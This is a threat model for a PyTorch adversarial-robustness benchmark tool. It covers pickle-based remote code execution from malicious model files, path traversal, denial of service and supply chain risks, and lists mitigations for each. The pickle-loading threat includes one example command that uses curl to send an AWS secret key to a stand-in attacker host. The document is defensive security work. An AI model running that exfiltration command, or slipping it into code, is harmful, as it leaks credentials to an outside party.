# Threat Model: adversarial-ml-lab

**Version:** 1.0.0
**Last reviewed:** 2026-08-05
**Scope:** The benchmark runner tool itself — not the ML models it evaluates.

---

## Overview

This document describes the threat model for the `adversarial-ml-lab` benchmark harness. It covers what the tool does, who runs it, what it trusts, and what an attacker could do if they control one of the inputs.

The primary attack surface is **model file loading**: the tool accepts a `.pt`/`.pth` file path as input, loads it with `torch.load()`, and evaluates it. This is a well-known, high-severity risk surface in ML tooling.

---

## System Description

```
┌────────────────────────────────────────────────────────┐
│                    OPERATOR WORKSTATION                 │
│  (pre-deployment evaluation environment, not prod)      │
│                                                        │
│   ┌─────────────┐    ┌──────────────────────────────┐  │
│   │  model.pt   │───▶│  benchmark_runner.py         │  │
│   │ (untrusted?)│    │  - loads model               │  │
│   └─────────────┘    │  - generates synthetic batch │  │
│                      │  - runs FGSM / PGD / C&W     │  │
│   ┌─────────────┐    │  - writes JSON report        │  │
│   │  --epsilon  │───▶│                              │  │
│   │  --output   │    └──────────────┬───────────────┘  │
│   └─────────────┘                   │                  │
│                                     ▼                  │
│                          benchmark_report.json         │
└────────────────────────────────────────────────────────┘
```

**Intended environment:** An isolated, pre-deployment evaluation workstation or CI runner. Not a production inference service. Not a shared multi-tenant environment.

---

## Trust Boundaries

| Input | Trust Level | Notes |
|-------|------------|-------|
| `--model-path` (model file) | **UNTRUSTED** unless operator controls provenance | See threat TM-001 below |
| `--epsilon` (float) | Low risk — argparse-validated float | Unbounded values cause slow/noisy benchmarks but not security issues |
| `--output` (output path) | Medium risk — path traversal possible | See TM-003 below |
| Synthetic evaluation data | **TRUSTED** — generated internally | No external input used for evaluation data |
| PyTorch / Python dependencies | Trusted with pinned versions | Supply chain risk managed via pinned deps + bandit in CI |
| Operator running the tool | **TRUSTED** — operator has chosen to run this | If operator is compromised, all bets are off |

---

## Threat Catalogue

### TM-001: Malicious model file (RCE via pickle deserialization) — **CRITICAL**

**Attack scenario:**
An attacker provides a crafted `.pt` file. PyTorch model files are Python pickle archives. A malicious pickle payload can execute arbitrary Python code when deserialized — including spawning shells, exfiltrating environment variables, or establishing persistence.

Example: a crafted `model.pt` that runs `os.system("curl http://attacker.com/exfil?key=$AWS_SECRET_ACCESS_KEY")` on load.

**Impact:** Full code execution on the evaluation workstation with the privileges of the user running the tool. Credential theft, lateral movement, data exfiltration.

**Likelihood (without mitigations):** HIGH — trivial to craft a malicious pickle; extensively documented in the wild.

**Mitigations implemented:**
1. `torch.load(..., weights_only=True)` — blocks arbitrary deserialization classes. Requires PyTorch ≥ 2.0. Raises `UnpicklingError` on non-tensor payloads.
2. File extension validation — rejects any file that is not `.pt` or `.pth`.
3. Log warning on external model load — makes loading from external paths visible in audit logs.
4. Error fallback — if loading fails for any reason, the tool falls back to DummyCNN rather than crashing silently.

**Residual risk:** `weights_only=True` protects against most known attack vectors but is not a complete guarantee. PyTorch's allowlist of safe classes may contain gadgets in some versions. **Do not run this tool against model files from untrusted sources outside a sandboxed environment.**

**Recommended additional controls (not implemented here):**
- Run in a container with no network access and read-only filesystem except for the output path
- Verify a cryptographic hash of the model file before loading (e.g., SHA-256 from your model registry)
- Use a dedicated low-privilege service account with no AWS/cloud credentials in the environment

---

### TM-002: Gradient/model information leakage — **LOW**

**Attack scenario:**
The benchmark runner logs gradient information (via PyTorch autograd) during attack computation. If an attacker can read the logs, they learn gradient structure that could assist in crafting more effective transfer attacks.

**Impact:** Information disclosure about model internals. Useful to an adversary who wants to attack the production model.

**Likelihood:** LOW — requires attacker to already have access to benchmark logs, which implies significant existing access.

**Mitigations:** Logs at INFO level do not include gradient values; only summary accuracy statistics. DEBUG mode should not be enabled in shared logging environments.

---

### TM-003: Path traversal via `--output` argument — **MEDIUM**

**Attack scenario:**
An attacker who can control the `--output` CLI argument (e.g., in a CI pipeline that passes user-supplied values) could write the benchmark JSON report to an arbitrary path — overwriting files like `~/.ssh/authorized_keys` or CI configuration files.

**Impact:** Arbitrary file write with the content of a benchmark JSON report. Exploitability depends on what can be achieved by writing a valid JSON file to a sensitive path.

**Likelihood:** MEDIUM in automated pipelines where `--output` is derived from user input; LOW in direct human use.

**Mitigations implemented:**
- Output path is passed directly to `open()` — no mitigation beyond OS-level write permissions.

**Recommended controls:**
- Validate `--output` to a known safe directory in CI pipeline wrappers.
- Run as a low-privilege user without write access outside the report output directory.

---

### TM-004: Denial of service via large epsilon or attack parameters — **LOW**

**Attack scenario:**
An attacker (or misconfigured automation) passes very large `epsilon`, `num_iter`, or `c` values, causing the benchmark to consume excessive CPU/GPU for extended periods.

**Impact:** Availability impact on the evaluation workstation. No security boundary violation.

**Mitigation:** Not implemented — this is a research tool with no SLA. Document that `--epsilon` should be in the range [0, 1] and `num_iter` defaults are capped.

---

### TM-005: Supply chain attack on PyTorch or numpy — **MEDIUM**

**Attack scenario:**
A malicious version of `torch`, `numpy`, or another dependency is installed (typosquatting, compromised PyPI package, or dependency confusion attack).

**Impact:** Arbitrary code execution at import time.

**Mitigations:**
- All dependencies pinned to exact versions in `pyproject.toml`.
- CI runs `bandit -r src/ -ll` on every PR.
- Recommended: verify package hashes via `pip install --require-hashes` in production evaluation environments.

---

## What This Tool Does NOT Do

- It does not load or process real user data or PII.
- It does not make network requests (no phone-home, no model registry API calls).
- It does not store model weights — it loads, evaluates, and discards.
- It does not run in a production inference pipeline.
- It does not perform authenticated operations — no credentials are read or used.

---

## Deployment Recommendations

| Recommendation | Rationale |
|---------------|-----------|
| Run in a container with `--network none` | Prevents exfiltration if TM-001 is triggered |
| Use a dedicated low-privilege service account | Limits blast radius of RCE |
| Verify model file SHA-256 before running | Closes TM-001 for known-good models |
| Only load model files from your own model registry | Eliminates most TM-001 risk |
| Set `--output` to a pre-created, scoped directory | Mitigates TM-003 |
| Pin PyTorch version and verify hashes | Mitigates TM-005 |

---

## MITRE ATT&CK / ATLAS Alignment

This threat model is informed by:

| Technique | Relevance |
|-----------|-----------|
| AML.T0015 — Evade ML Model | What this tool measures |
| T1059 — Command and Scripting Interpreter | TM-001 RCE vector |
| T1195 — Supply Chain Compromise | TM-005 |
| T1083 — File and Directory Discovery | TM-003 path traversal |
| T1552 — Unsecured Credentials | TM-001 credential exfiltration scenario |

---

*This threat model covers the tool itself. Threat models for the ML models evaluated by this tool are out of scope here — see individual model documentation.*
